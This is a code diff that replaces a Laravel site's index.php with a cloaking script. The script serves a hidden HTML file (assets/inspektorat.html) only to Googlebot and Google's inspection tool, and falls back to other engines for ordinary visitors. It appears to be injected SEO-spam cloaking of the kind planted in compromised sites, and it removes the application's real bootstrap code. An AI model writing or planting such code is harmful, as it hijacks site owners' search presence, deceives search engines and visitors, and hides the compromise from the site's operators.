@@ -1,55 +1,37 @@
 <?php
 
-use Illuminate\Contracts\Http\Kernel;
-use Illuminate\Http\Request;
-
-define('LARAVEL_START', microtime(true));
-
-/*
-|--------------------------------------------------------------------------
-| Check If The Application Is Under Maintenance
-|--------------------------------------------------------------------------
-|
-| If the application is in maintenance / demo mode via the "down" command
-| we will load this file so that any pre-rendered content can be shown
-| instead of starting the framework, which could cause an exception.
-|
-*/
-
-if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
-    require $maintenance;
+$user_agent = '';
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
 }
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| this application. We just need to utilize it! We'll simply require it
-| into the script here so we don't need to manually load our classes.
-|
-*/
+$is_googlebot = false;
+if ($user_agent !== '') {
+    $is_googlebot = preg_match('/Googlebot|Google-InspectionTool/i', $user_agent);
+}
 
-require __DIR__.'/../vendor/autoload.php';
+$cloak_file = dirname(__FILE__) . '/assets/inspektorat.html';
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request using
-| the application's HTTP kernel. Then, we will send the response back
-| to this client's browser, allowing them to enjoy our application.
-|
-*/
 
-$app = require_once __DIR__.'/../bootstrap/app.php';
+if ($is_googlebot) {
 
-$kernel = $app->make(Kernel::class);
+    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+    header("Pragma: no-cache");
+    header("Expires: 0");
 
-$response = $kernel->handle(
-    $request = Request::capture()
-)->send();
+    if (file_exists($cloak_file)) {
+        header('Content-Type: text/html');
+        readfile($cloak_file);
+        exit;
+    }
+}
 
-$kernel->terminate($request, $response);
+if (file_exists(dirname(__FILE__) . '/default.php')) {
+    require dirname(__FILE__) . '/default.php';
+} elseif (file_exists(dirname(__FILE__) . '/wp-blog-header.php')) {
+    define('WP_USE_THEMES', true);
+    require dirname(__FILE__) . '/wp-blog-header.php';
+} else {
+    echo "Website aktif namun tidak bisa menemukan engine utama.";
+}
+?>
